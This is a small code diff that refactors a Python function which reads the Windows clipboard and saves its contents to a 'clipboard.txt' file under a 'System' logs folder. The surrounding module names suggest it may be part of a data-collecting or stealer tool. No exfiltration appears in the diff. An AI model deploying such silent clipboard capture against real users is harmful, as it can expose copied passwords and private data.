@@ -1,18 +1,18 @@
 from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
-from os import environ
+from os.path import join
 from manager.logger import Log
 from preferences.config import config
 
 def ClipBoard():
-    pathToLogs = f'{config.pathToLogs}\\System'
+    pathToLogs = join(config.pathToLogs, "System")
     try:
         OpenClipboard()
         data = GetClipboardData()
     except Exception as e:
         Log(f"ClipBoard ---> {e}")
-        data =  "none"
+        data = "None"
         
     finally:
         CloseClipboard()
-        with open(pathToLogs+"\\clipboard.txt", 'w', encoding='UTF-8') as f:
+        with open(join(pathToLogs, "clipboard.txt"), 'w', encoding='UTF-8') as f:
             f.write(data)
